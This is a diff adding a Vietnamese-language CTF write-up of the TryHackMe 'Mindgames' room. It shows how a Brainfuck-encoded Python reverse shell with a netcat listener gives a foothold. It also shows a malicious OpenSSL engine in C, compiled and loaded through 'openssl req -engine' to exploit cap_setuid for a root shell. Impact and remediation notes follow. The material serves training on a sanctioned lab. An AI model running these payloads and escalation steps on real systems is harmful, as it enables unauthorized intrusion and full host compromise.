@@ -1,0 +1,130 @@
+---
+title: 'Mindgames'
+description: 'Một trình thông dịch Brainfuck công khai chạy code do kẻ tấn công cung cấp, nên một reverse shell Python mã hoá sang esolang cho foothold; sau đó openssl mang capability cap_setuid bị lạm dụng bằng một engine độc hại để sinh root shell.'
+date: 2026-02-25
+platform: tryhackme
+room: 'Mindgames'
+roomUrl: 'https://tryhackme.com/room/mindgames'
+difficulty: medium
+tags:
+  - 'web'
+  - 'rce'
+  - 'linux'
+  - 'privesc'
+vulnClasses:
+  - 'insecure command execution'
+  - 'insecure privileged service'
+translation: done
+draft: false
+---
+
+_Hướng dẫn giải phòng "Mindgames" trên TryHackMe. Cả box là một trò đánh đố tâm lý: một trang web tự hào chạy code viết bằng một ngôn ngữ bí hiểm, mà thực chất là một cỗ máy thực thi code tuỳ ý trá hình. Ta mã hoá một reverse shell Python thành Brainfuck để có foothold, rồi lạm dụng một binary_ _`openssl`_ _được cấp capability_ _`cap_setuid`_ _để đi thẳng lên root._
+
+> Mindgames là một challenge huấn luyện hợp pháp trên TryHackMe; mọi thao tác ở đây đều thực hiện trên mục tiêu luyện tập được cấp phép. Cả hai flag hiển thị dưới dạng `THM{<redacted>}` — có thật trên máy, giấu đi ở đây.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+Cổng 80 phục vụ một trang “chạy” Brainfuck → thực chất nó transpile và thực thi code tuỳ ý, nên ta mã hoá một **reverse shell Python** thành Brainfuck và gửi lên để **RCE dưới** **`mindgames`** (user flag) → liệt kê SUID/capabilities và thấy `/usr/bin/openssl` mang **`cap_setuid+ep`** → biên dịch một OpenSSL **engine** độc hại có constructor gọi `setuid(0)` và sinh một shell → nạp nó bằng `openssl req -engine ./engine.so` để có shell **root** (root flag).
+
+</Callout>
+
+### **Mục tiêu**
+
+```text
+export IP=<target-ip>
+export ATTACKER_IP=<your-ip>
+```
+
+`nmap` cho thấy SSH và một web server Go:
+
+```text
+22/tcp open  ssh   OpenSSH 7.6p1 Ubuntu
+80/tcp open  http  Golang net/http server   # "Mindgames."
+```
+
+Trang web bày ra một ô code thực thi **Brainfuck**, kèm các mẫu “Hello, world” và Fibonacci để chứng tỏ nó chạy chương trình thật. Brute-force thư mục không ra gì — chính trình thông dịch _là_ bề mặt tấn công.
+
+### **Lỗ hổng**
+
+“Câu câu khách” của site là nó chạy code bạn gửi lên. Một ngôn ngữ bí hiểm vẫn là một ngôn ngữ Turing-complete: nếu server sẽ thực thi Brainfuck tuỳ ý, nó sẽ thực thi bất cứ thứ gì mà Brainfuck đó transpile ra. Đây là **thực thi mã tuỳ ý theo thiết kế**, khoác áo một món đồ chơi.
+
+<Callout type="insight">
+
+Các mẫu chứng minh cỗ máy ánh xạ Brainfuck sang hành vi ở mức Python thật (in, vòng lặp). Nên exploit chỉ là một bài toán dịch: viết một reverse shell Python bình thường, **mã hoá nó thành Brainfuck**, và gửi lên. “Ngôn ngữ khó hiểu” không phải là một ranh giới bảo mật — chạy code không đáng tin vẫn là chạy code không đáng tin, dù cú pháp là gì.
+
+</Callout>
+
+### **Bước 1 — reverse shell mã hoá Brainfuck → foothold (user flag)**
+
+Viết một reverse shell Python, mã hoá sang Brainfuck (bất kỳ encoder Python→BF nào cũng được), và dán vào ô chạy. Một payload được lược bớt tránh cho interpreter nghẽn vì kích thước:
+
+```text
+# attacker
+nc -lnvp 4444
+# paste the Brainfuck-encoded python reverse shell into the web run box
+```
+
+```text
+# caught
+$ whoami
+mindgames
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+mindgames@mindgames:~$ cat user.txt
+THM{<redacted>}
+```
+
+### **Bước 2 — lạm dụng capability cap_setuid của openssl → root (root flag)**
+
+Một lượt quét SUID và `linpeas` làm nổi vấn đề thật ở phần **Capabilities**: `/usr/bin/openssl` được cấp `cap_setuid+ep`. Capabilities của Linux không nằm trong GTFOBins theo kiểu SUID thuần — đường sạch là một OpenSSL **engine** độc hại (một shared object mà OpenSSL sẽ `dlopen`). Constructor của nó chạy khi được nạp, nên ta gọi `setuid(0)` và exec một shell:
+
+```text
+// engine.c
+#include <unistd.h>
+__attribute__((constructor))
+static void init(){
+    setuid(0);
+    execl("/bin/sh", "sh", NULL);
+}
+```
+
+Biên dịch nó với libcrypto, upload, và nạp qua openssl:
+
+```text
+gcc -fPIC -o a.o -c engine.c && gcc -shared -o engine.so -lcrypto a.o
+# upload engine.so to the target (python3 -m http.server + wget), then:
+mindgames@mindgames:/tmp$ /usr/bin/openssl req -engine ./engine.so
+# whoami -> root
+# cat /root/root.txt -> THM{<redacted>}
+```
+
+Vì openssl giữ `cap_setuid`, lệnh `setuid(0)` trong engine của ta thành công và shell nó sinh ra là root.
+
+### **Tác động**
+
+<Callout type="critical">
+
+**Nghiêm trọng — CVSS 3.1 \~9.8** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`). Dịch vụ web thực thi code tuỳ ý do kẻ tấn công cung cấp mà không có sandbox, cho phép thực thi mã từ xa chưa xác thực dưới quyền tài khoản dịch vụ. Một capability nguy hiểm (`cap_setuid`) trên `openssl` sau đó cho phép leo thang tầm thường lên root qua một engine nạp được — xâm phạm hoàn toàn host.
+
+</Callout>
+
+### **Khuyến nghị khắc phục**
+
+<Callout type="fix">
+
+- **Không bao giờ thực thi code không đáng tin ở server.** Nếu một trình chạy code là yêu cầu sản phẩm, hãy cô lập thật chặt (container/jail, seccomp, không mạng ra ngoài, giới hạn CPU/bộ nhớ/thời gian nghiêm ngặt, hạ quyền).
+- **Không cấp** **`cap_setuid`** **cho binary đa dụng.** `openssl` với `cap_setuid+ep` tương đương một root shell; audit file capabilities (`getcap -r /`) và gỡ bỏ bất cứ thứ gì không cần.
+- **Chạy dịch vụ web dưới một user không đặc quyền, bị cô lập** để một foothold không có chỗ nào rõ ràng để đi tiếp.
+
+</Callout>
+
+### **Bài học rút ra**
+
+- **Một ngôn ngữ “bí hiểm” không phải là biện pháp bảo mật.** Nếu server chạy Brainfuck của bạn, nó chạy reverse shell của bạn.
+- **Capabilities là người anh em thầm lặng của SUID.** `getcap -r /` nên nằm trong mọi checklist privesc; `cap_setuid` trên một binary linh hoạt như openssl là kết thúc cuộc chơi.
+- **OpenSSL engine là một primitive lạm dụng capability sạch sẽ** — một constructor trong `.so` được nạp chạy với bất kỳ quyền nào mà bộ nạp đang giữ.
+
+Mindgames đúng với cái tên: mẹo là nhận ra “câu đố” chỉ là thực thi code thuần túy khoác trang phục. Cảm ơn đã đọc.
